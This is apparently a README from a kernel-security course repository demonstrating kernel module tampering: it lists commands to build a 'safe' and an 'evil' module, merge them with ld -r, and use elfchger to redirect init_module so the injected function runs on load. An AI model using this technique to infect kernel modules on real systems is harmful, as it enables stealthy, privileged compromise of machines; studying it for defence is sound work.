# Chap6-kernel-security/kernel/module-tampering
Have fun with malicious Kernel code.

# Usage

Compile safe-module sources : 
> user@machine:~/safe-module$ make

compile evil-module sources :
> user@machine:~/evil-module$ make

Combine the two modules :
> ld − r safe-module/kernel−module−safe.ko evil-module/kernel−module−to-inject.ko −o kernel−module−infected.ko

Force module to execute evil function :
>./elfchger -s init_module -v 00000014 kernel-module-infected.ko

Read kernel messages :
> dmesg 

Congrats, that's a Hacking with perfection. Enjoy!

# Feedbacks
Please feel free to contact me : <jugurtha.belkalem@smile.fr>
